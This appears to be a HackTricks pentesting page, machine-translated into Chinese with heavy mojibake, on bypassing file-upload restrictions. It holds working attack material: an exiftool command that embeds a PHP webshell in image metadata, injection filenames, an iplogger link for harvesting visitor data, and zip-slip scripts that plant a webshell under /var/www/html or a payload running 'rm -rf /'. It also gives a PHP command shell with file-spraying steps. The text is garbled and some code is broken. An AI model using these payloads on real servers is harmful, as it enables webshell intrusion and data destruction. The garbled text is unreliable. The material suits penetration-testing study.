<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTæ”¶è—å“The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


# æ–‡ä»¶ä¸Šä¼ é€šç”¨æ–¹æ³•è®º

1. å°è¯•ä½¿ç”¨**åŒé‡æ‰©å±•å**ä¸Šä¼ æ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼š_file.png.php_ æˆ– _file.png.php5_ï¼‰ã€‚
* PHPæ‰©å±•åï¼š_.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, ._phps_, ._pht_, _.phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc_
* ASPæ‰©å±•åï¼š_.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .asp, .cer, .shtml_
2. å°è¯•å°†æ‰©å±•åçš„**æŸäº›å­—æ¯å¤§å†™**ï¼Œä¾‹å¦‚ï¼š_.pHp, .pHP5, .PhAr ..._
3. å°è¯•ä¸Šä¼ ä¸€äº›**åŒé‡ï¼ˆæˆ–æ›´å¤šï¼‰æ‰©å±•å**ï¼ˆç”¨äºç»•è¿‡é”™è¯¯é…ç½®çš„æ£€æŸ¥ï¼Œæ£€æŸ¥ç‰¹å®šæ‰©å±•åæ˜¯å¦å­˜åœ¨ï¼‰ï¼š
1. _file.png.php_
2. _file.png.txt.php_
4. å°è¯•ä¸Šä¼ ä¸€äº›**åå‘åŒé‡æ‰©å±•å**ï¼ˆç”¨äºåˆ©ç”¨Apacheé…ç½®é”™è¯¯ï¼Œå…¶ä¸­ä»»ä½•å…·æœ‰_.php_æ‰©å±•åçš„æ–‡ä»¶ï¼Œä½†**ä¸ä¸€å®šä»¥.phpç»“å°¾**ï¼Œéƒ½å°†æ‰§è¡Œä»£ç ï¼‰ï¼š
* ä¾‹å¦‚ï¼šfile.php.png
5. ä½¿ç”¨**ç©ºå­—ç¬¦çš„åŒé‡æ‰©å±•å**ï¼š
1. ä¾‹å¦‚ï¼šfile.php%00.png
6. åœ¨æ‰©å±•åçš„æœ«å°¾**æ·»åŠ ä¸€äº›ç‰¹æ®Šå­—ç¬¦**ï¼š_ï¼…00ï¼Œï¼…20ï¼Œï¼ˆå¤šä¸ªç‚¹ï¼‰...._
1. _file.php%00_
2. _file.php%20_
3. _file.php...... --&gt; åœ¨Windowsä¸­ï¼Œå¦‚æœæ–‡ä»¶ä»¥ç‚¹ç»“å°¾ï¼Œè¿™äº›ç‚¹å°†è¢«åˆ é™¤ï¼ˆå› æ­¤å¯ä»¥ç»•è¿‡æ£€æŸ¥æ‰©å±•åä¸º.phpçš„è¿‡æ»¤å™¨ï¼‰
4. _file.php/_
5. _file.php.\_
7. é€šè¿‡å°†**Content-Type** **header**çš„**value**è®¾ç½®ä¸ºï¼š_image/png_ï¼Œ_text/plain_ï¼Œ_application/octet-stream_ï¼Œç»•è¿‡Content-Typeæ£€æŸ¥ã€‚
8. é€šè¿‡åœ¨æ–‡ä»¶å¼€å¤´æ·»åŠ **çœŸå®å›¾åƒçš„å­—èŠ‚**ï¼ˆæ··æ·†_file_å‘½ä»¤ï¼‰æ¥ç»•è¿‡é­”æœ¯æ•°å­—æ£€æŸ¥ã€‚æˆ–è€…åœ¨**å…ƒæ•°æ®**ä¸­å¼•å…¥shellï¼š`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`
1. ä¹Ÿæœ‰å¯èƒ½åªæ˜¯åœ¨æ–‡ä»¶ä¸­**æ£€æŸ¥**é­”æœ¯å­—èŠ‚ï¼Œå¹¶ä¸”æ‚¨å¯ä»¥åœ¨æ–‡ä»¶çš„**ä»»ä½•ä½ç½®**è®¾ç½®å®ƒä»¬ã€‚
9. åœ¨**Windows**ä¸­ä½¿ç”¨**NTFSå¤‡ç”¨æ•°æ®æµï¼ˆADSï¼‰**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç¦æ­¢çš„æ‰©å±•ååé¢ä¼šæ’å…¥ä¸€ä¸ªå†’å·å­—ç¬¦â€œ:â€ï¼Œç„¶åæ˜¯å…è®¸çš„æ‰©å±•åã€‚ç»“æœï¼Œåœ¨æœåŠ¡å™¨ä¸Šå°†åˆ›å»ºä¸€ä¸ªå¸¦æœ‰ç¦æ­¢çš„æ‰©å±•åçš„**ç©ºæ–‡ä»¶**ï¼ˆä¾‹å¦‚â€œfile.asax:.jpgâ€ï¼‰ã€‚ç¨åå¯ä»¥ä½¿ç”¨å…¶ä»–æŠ€æœ¯ï¼ˆä¾‹å¦‚ä½¿ç”¨å…¶çŸ­æ–‡ä»¶åï¼‰ç¼–è¾‘æ­¤æ–‡ä»¶ã€‚è¿˜å¯ä»¥ä½¿ç”¨â€œ**::$data**â€æ¨¡å¼åˆ›å»ºéç©ºæ–‡ä»¶ã€‚å› æ­¤ï¼Œåœ¨æ­¤æ¨¡å¼åé¢æ·»åŠ ä¸€ä¸ªç‚¹å­—ç¬¦ä¹Ÿå¯èƒ½æœ‰åŠ©äºç»•è¿‡è¿›ä¸€æ­¥çš„é™åˆ¶ï¼ˆä¾‹å¦‚â€œfile.asp::$data.â€ï¼‰ã€‚
10. ä½¿ç”¨**å…è®¸çš„æ‰©å±•å**ï¼ˆ_png_ï¼‰ä¸Šä¼ åé—¨ï¼Œå¹¶ç¥ˆç¥·å‡ºç°**é…ç½®é”™è¯¯**ä»¥æ‰§è¡Œåé—¨ã€‚
11. æŸ¥æ‰¾**é‡å‘½å**å·²ä¸Šä¼ çš„æ–‡ä»¶çš„æ¼æ´ï¼ˆæ›´æ”¹æ‰©å±•åï¼‰ã€‚
12. æŸ¥æ‰¾**æœ¬åœ°æ–‡ä»¶åŒ…å«**æ¼æ´ä»¥æ‰§è¡Œåé—¨ã€‚
13. **å¯èƒ½çš„ä¿¡æ¯æ³„éœ²**ï¼š
1. **å¤šæ¬¡**ï¼ˆå¹¶ä¸”**åŒæ—¶**ï¼‰ä¸Šä¼ **ç›¸åŒçš„æ–‡ä»¶**ï¼Œ**ç›¸åŒçš„åç§°**
2. ä¸Šä¼ ä¸€ä¸ª**å·²å­˜åœ¨çš„æ–‡ä»¶**æˆ–**æ–‡ä»¶å¤¹**çš„åç§°çš„æ–‡ä»¶
3. ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå…¶åç§°ä¸º**â€œ.â€ã€â€œ..â€æˆ–â€œâ€¦â€**ã€‚ä¾‹å¦‚ï¼Œåœ¨**Windows**çš„Apacheä¸­ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå°†ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨â€œ/www/uploads/â€ç›®å½•ä¸­ï¼Œåˆ™â€œ.â€æ–‡ä»¶åå°†åœ¨â€œ/www/â€ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºâ€œuploadsâ€çš„æ–‡ä»¶ã€‚
4. åœ¨**NTFS**ä¸­ä¸Šä¼ ä¸€ä¸ªå¯èƒ½ä¸å®¹æ˜“åˆ é™¤çš„æ–‡ä»¶ï¼Œä¾‹å¦‚â€œâ€¦:.jpgâ€ã€‚ï¼ˆWindowsï¼‰
5. åœ¨**Windows**ä¸­ä½¿ç”¨**æ— æ•ˆå­—ç¬¦**ï¼ˆä¾‹å¦‚`|<>*?â€`ï¼‰ä¸Šä¼ æ–‡ä»¶çš„åç§°ã€‚ï¼ˆWindowsï¼‰
6. åœ¨**Windows**ä¸­ä¸Šä¼ æ–‡ä»¶æ—¶ä½¿ç”¨**ä¿ç•™**ï¼ˆ**ç¦æ­¢**ï¼‰çš„**åç§°**ï¼Œä¾‹å¦‚CONã€PRNã€AUXã€NULã€COM1ã€COM2ã€COM3ã€COM4ã€COM5ã€COM6ã€COM7ã€COM8ã€COM9ã€LPT1ã€LPT2ã€LPT3ã€LPT4ã€LPT5ã€LPT6ã€LPT7ã€LPT8å’ŒLPT9ã€‚

è¿˜å¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆ.exeï¼‰æˆ–ä¸€ä¸ªè¾ƒä¸å¯ç–‘çš„.htmlæ–‡ä»¶ï¼ˆå½“å—å®³è€…æ„å¤–æ‰“å¼€æ—¶å°†æ‰§è¡Œä»£ç ï¼‰ã€‚

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files" %}

å¦‚æœæ‚¨æ­£åœ¨å°è¯•å°†æ–‡ä»¶ä¸Šä¼ åˆ°**PHPæœåŠ¡å™¨**ï¼Œè¯·æŸ¥çœ‹[**.htaccess**æŠ€å·§ä»¥æ‰§è¡Œä»£ç ](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess)ã€‚
å¦‚æœæ‚¨æ­£åœ¨å°è¯•å°†æ–‡ä»¶ä¸Šä¼ åˆ°**ASPæœåŠ¡å™¨**ï¼Œè¯·æŸ¥çœ‹[**.config**æŠ€å·§ä»¥æ‰§è¡Œä»£ç ](../pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files)ã€‚
`.phar`æ–‡ä»¶ç±»ä¼¼äºJavaçš„`.jar`æ–‡ä»¶ï¼Œä½†ç”¨äºPHPï¼Œå¹¶ä¸”å¯ä»¥åƒPHPæ–‡ä»¶ä¸€æ ·ä½¿ç”¨ï¼ˆä½¿ç”¨phpæ‰§è¡Œå®ƒï¼Œæˆ–åœ¨è„šæœ¬ä¸­åŒ…å«å®ƒ...ï¼‰

`.inc`æ‰©å±•åæœ‰æ—¶ç”¨äºä»…ç”¨äºå¯¼å…¥æ–‡ä»¶çš„PHPæ–‡ä»¶ï¼Œå› æ­¤åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒæŸäººå¯èƒ½å·²ç»å…è®¸æ‰§è¡Œæ­¤æ‰©å±•åã€‚

ä½¿ç”¨BurpSuitæ’ä»¶[https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)æ£€æŸ¥è®¸å¤šå¯èƒ½çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæˆ–ä½¿ç”¨ä¸€ä¸ªæ§åˆ¶å°åº”ç”¨ç¨‹åºæ‰¾å‡ºå¯ä»¥ä¸Šä¼ çš„æ–‡ä»¶å¹¶å°è¯•ä¸åŒçš„æŠ€å·§æ¥æ‰§è¡Œä»£ç ï¼š[https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)

## wgetæ–‡ä»¶ä¸Šä¼ /SSRFæŠ€å·§

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½ä¼šå‘ç°æœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨`wget`æ¥ä¸‹è½½æ–‡ä»¶ï¼Œå¹¶ä¸”æ‚¨å¯ä»¥æŒ‡å®šURLã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œä»£ç å¯èƒ½ä¼šæ£€æŸ¥ä¸‹è½½æ–‡ä»¶çš„æ‰©å±•åæ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œä»¥ç¡®ä¿åªæœ‰å…è®¸çš„æ–‡ä»¶æ‰èƒ½ä¸‹è½½ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªæ£€æŸ¥å¯ä»¥è¢«ç»•è¿‡ã€‚
åœ¨Linuxä¸­ï¼Œæ–‡ä»¶åçš„æœ€å¤§é•¿åº¦ä¸º255ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯`wget`å°†æ–‡ä»¶åæˆªæ–­ä¸º236ä¸ªå­—ç¬¦ã€‚æ‚¨å¯ä»¥ä¸‹è½½ä¸€ä¸ªåä¸º"A"\*232+".php"+".gif"çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åå°†ç»•è¿‡æ£€æŸ¥ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ".gif"æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ‰©å±•åï¼‰ï¼Œä½†æ˜¯`wget`å°†æŠŠæ–‡ä»¶é‡å‘½åä¸º"A"\*232+".php"ã€‚
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
è¯·æ³¨æ„ï¼Œä½ å¯èƒ½ä¼šè€ƒè™‘çš„**å¦ä¸€ç§é€‰æ‹©**æ˜¯ç»•è¿‡æ­¤æ£€æŸ¥çš„æ–¹æ³•æ˜¯ä½¿**HTTPæœåŠ¡å™¨é‡å®šå‘åˆ°å¦ä¸€ä¸ªæ–‡ä»¶**ï¼Œè¿™æ ·åˆå§‹URLå°†é€šè¿‡æ£€æŸ¥ï¼Œç„¶åwgetå°†ä½¿ç”¨æ–°åç§°ä¸‹è½½é‡å®šå‘çš„æ–‡ä»¶ã€‚è¿™**ä¸ä¼šèµ·ä½œç”¨**ï¼Œ**é™¤é**wgetä¸å‚æ•°`--trust-server-names`ä¸€èµ·ä½¿ç”¨ï¼Œå› ä¸º**wgetå°†ä½¿ç”¨åŸå§‹URLä¸­æŒ‡å®šçš„æ–‡ä»¶åä¸‹è½½é‡å®šå‘çš„é¡µé¢**ã€‚

# ä»æ–‡ä»¶ä¸Šä¼ åˆ°å…¶ä»–æ¼æ´

* å°†**æ–‡ä»¶å**è®¾ç½®ä¸º`../../../tmp/lol.png`ï¼Œå°è¯•å®ç°**è·¯å¾„éå†**
* å°†**æ–‡ä»¶å**è®¾ç½®ä¸º`sleep(10)-- -.jpg`ï¼Œå¯èƒ½èƒ½å¤Ÿå®ç°**SQLæ³¨å…¥**
* å°†**æ–‡ä»¶å**è®¾ç½®ä¸º`<svg onload=alert(document.comain)>`ï¼Œå®ç°XSS
* å°†**æ–‡ä»¶å**è®¾ç½®ä¸º`; sleep 10;`ï¼Œæµ‹è¯•ä¸€äº›å‘½ä»¤æ³¨å…¥ï¼ˆæ›´å¤š[å‘½ä»¤æ³¨å…¥æŠ€å·§åœ¨è¿™é‡Œ](command-injection.md)ï¼‰
* [å›¾åƒï¼ˆsvgï¼‰æ–‡ä»¶ä¸Šä¼ ä¸­çš„**XSS**](xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS**æ–‡ä»¶**ä¸Šä¼ ** + **XSS** = [**Service Workers**åˆ©ç”¨](xss-cross-site-scripting/#xss-abusing-service-workers)
* [svgä¸Šä¼ ä¸­çš„**XXE**](xxe-xee-xml-external-entity.md#svg-file-upload)
* [é€šè¿‡ä¸Šä¼ svgæ–‡ä»¶å®ç°**å¼€æ”¾é‡å®šå‘**](open-redirect.md#open-redirect-uploading-svg-files)
* [è‘—åçš„**ImageTrick**æ¼æ´](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* å¦‚æœä½ å¯ä»¥**æŒ‡ç¤ºWebæœåŠ¡å™¨ä»URLä¸­è·å–å›¾åƒ**ï¼Œä½ å¯ä»¥å°è¯•æ»¥ç”¨[SSRF](ssrf-server-side-request-forgery.md)ã€‚å¦‚æœè¿™ä¸ª**å›¾åƒ**å°†è¦è¢«**ä¿å­˜**åœ¨æŸä¸ª**å…¬å…±**ç«™ç‚¹ä¸Šï¼Œä½ è¿˜å¯ä»¥æŒ‡å®šä¸€ä¸ªæ¥è‡ª[https://iplogger.org/invisible/](https://iplogger.org/invisible/)çš„URLï¼Œå¹¶**çªƒå–æ¯ä¸ªè®¿é—®è€…çš„ä¿¡æ¯**ã€‚

ä»¥ä¸‹æ˜¯é€šè¿‡ä¸Šä¼ æ–‡ä»¶å¯ä»¥å®ç°çš„å‰10é¡¹åŠŸèƒ½åˆ—è¡¨ï¼ˆæ¥è‡ª[é“¾æ¥](https://twitter.com/SalahHasoneh1/status/1281274120395685889)ï¼‰ï¼š

1. **ASP / ASPX / PHP5 / PHP / PHP3**ï¼šWebshell / RCE
2. **SVG**ï¼šå­˜å‚¨å‹XSS / SSRF / XXE
3. **GIF**ï¼šå­˜å‚¨å‹XSS / SSRF
4. **CSV**ï¼šCSVæ³¨å…¥
5. **XML**ï¼šXXE
6. **AVI**ï¼šLFI / SSRF
7. **HTML / JS**ï¼šHTMLæ³¨å…¥ / XSS / å¼€æ”¾é‡å®šå‘
8. **PNG / JPEG**ï¼šåƒç´ æ´ªæ°´æ”»å‡»ï¼ˆDoSï¼‰
9. **ZIP**ï¼šé€šè¿‡LFIå®ç°RCE / DoS
10. **PDF / PPTX**ï¼šSSRF / ç›²XXE

# è‡ªåŠ¨è§£å‹ç¼©ä¸Šä¼ çš„ZIPæ–‡ä»¶

å¦‚æœä½ å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå°†åœ¨æœåŠ¡å™¨å†…éƒ¨è§£å‹ç¼©çš„ZIPæ–‡ä»¶ï¼Œä½ å¯ä»¥åšä¸¤ä»¶äº‹ï¼š

## ç¬¦å·é“¾æ¥

ä¸Šä¼ ä¸€ä¸ªåŒ…å«æŒ‡å‘å…¶ä»–æ–‡ä»¶çš„è½¯é“¾æ¥çš„é“¾æ¥ï¼Œç„¶åè®¿é—®è§£å‹ç¼©çš„æ–‡ä»¶æ—¶ï¼Œä½ å°†è®¿é—®åˆ°é“¾æ¥çš„æ–‡ä»¶ï¼š
```text
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```
## åœ¨ä¸åŒçš„æ–‡ä»¶å¤¹ä¸­è§£å‹ç¼©

è§£å‹ç¼©çš„æ–‡ä»¶å°†ä¼šè¢«åˆ›å»ºåœ¨æ„æ–™ä¹‹å¤–çš„æ–‡ä»¶å¤¹ä¸­ã€‚

æœ‰äººå¯èƒ½ä¼šè®¤ä¸ºè¿™ç§è®¾ç½®å¯ä»¥é˜²æ­¢é€šè¿‡æ¶æ„æ–‡ä»¶ä¸Šä¼ è¿›è¡Œæ“ä½œç³»ç»Ÿçº§åˆ«çš„å‘½ä»¤æ‰§è¡Œï¼Œä½†ä¸å¹¸çš„æ˜¯ï¼Œè¿™æ˜¯ä¸æ­£ç¡®çš„ã€‚ç”±äºZIPå­˜æ¡£æ ¼å¼æ”¯æŒåˆ†å±‚å‹ç¼©ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜å¯ä»¥å¼•ç”¨æ›´é«˜çº§åˆ«çš„ç›®å½•ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡æ»¥ç”¨ç›®æ ‡åº”ç”¨ç¨‹åºçš„è§£å‹ç¼©åŠŸèƒ½æ¥é€ƒç¦»å®‰å…¨ä¸Šä¼ ç›®å½•ã€‚

å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªè‡ªåŠ¨åŒ–åˆ©ç”¨ç¨‹åºæ¥åˆ›å»ºè¿™ç§ç±»å‹çš„æ–‡ä»¶ï¼š[https://github.com/ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)
```python
python evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
ä¸€äº›åˆ›å»ºæ¶æ„zipæ–‡ä»¶çš„Pythonä»£ç ï¼š

```python
import zipfile

def create_malicious_zip(file_path, content):
    with zipfile.ZipFile(file_path, 'w') as zip_file:
        zip_file.writestr('../malicious_script.py', content)

malicious_content = '''
import os
os.system('rm -rf /')
'''

create_malicious_zip('malicious.zip', malicious_content)
```

è¿™æ®µPythonä»£ç ç”¨äºåˆ›å»ºæ¶æ„zipæ–‡ä»¶ã€‚å®ƒä¼šåœ¨æŒ‡å®šçš„æ–‡ä»¶è·¯å¾„ä¸‹åˆ›å»ºä¸€ä¸ªzipæ–‡ä»¶ï¼Œå¹¶å°†æ¶æ„å†…å®¹å†™å…¥å…¶ä¸­ã€‚æ¶æ„å†…å®¹æ˜¯ä¸€ä¸ªåŒ…å«åˆ é™¤æ“ä½œçš„Pythonè„šæœ¬ã€‚
```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def create_zip():
f = StringIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
ä¸ºäº†å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œæˆ‘é‡‡å–äº†ä»¥ä¸‹æ­¥éª¤ï¼š

1. åˆ›å»ºä¸€ä¸ªPHP shellï¼š
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2. ä½¿ç”¨â€œæ–‡ä»¶å–·æ´’â€æŠ€æœ¯åˆ›å»ºä¸€ä¸ªå‹ç¼©çš„zipæ–‡ä»¶ï¼š
```text
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
adding: xxAcmd.php (deflated 40%)
adding: xxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3. ä½¿ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æˆ–viå°†â€œxxAâ€æ›´æ”¹ä¸ºâ€œ../â€ï¼Œæˆ‘ä½¿ç”¨äº†viï¼š
```text
:set modifiable
:%s/xxA/..\//g
:x!
```
åªå‰©ä¸‹ä¸€æ­¥äº†ï¼šä¸Šä¼ ZIPæ–‡ä»¶å¹¶è®©åº”ç”¨ç¨‹åºè§£å‹ç¼©å®ƒï¼å¦‚æœæˆåŠŸå¹¶ä¸”WebæœåŠ¡å™¨å…·æœ‰è¶³å¤Ÿçš„æƒé™æ¥å†™å…¥ç›®å½•ï¼Œç³»ç»Ÿä¸Šå°†ä¼šæœ‰ä¸€ä¸ªç®€å•çš„æ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œshellï¼š

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**å‚è€ƒ**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

## ä½¿ç”¨ä¸åŒçš„åç§°è§£å‹ç¼©

æœ‰æ—¶å€™åº”ç”¨ç¨‹åºä¼šé€šè¿‡æ£€æŸ¥zipæ–‡ä»¶ä¸­çš„æ‰©å±•åæ¥é˜»æ­¢æ–‡ä»¶çš„åŠ è½½ã€‚å¦‚æœè¿™ç§éªŒè¯æ˜¯è‚¤æµ…çš„ï¼Œå³é€šè¿‡æ£€æŸ¥æœ¬åœ°å­—æ®µå¤´ä¸­æ–‡ä»¶çš„åç§°æ¥è¿›è¡Œï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡è®©åº”ç”¨ç¨‹åºç›¸ä¿¡æ–‡ä»¶å…·æœ‰æŸä¸ªæ‰©å±•åï¼Œè€Œå®é™…ä¸Šåœ¨è§£å‹ç¼©åå®ƒå°†å…·æœ‰å¦ä¸€ä¸ªæ‰©å±•åæ¥ç»•è¿‡æ­¤é™åˆ¶ã€‚

æˆ‘ä»¬å¯ä»¥é‡ç”¨ä¹‹å‰çš„è„šæœ¬æ¥åˆ›å»ºä¸€ä¸ªzipæ–‡ä»¶ã€‚
```python
#!/usr/bin/python

import zipfile
from cStringIO import StringIO

def create_zip():
f = StringIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('shell.php .pdf', '<?php echo system($_REQUEST["cmd"]); ?>')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
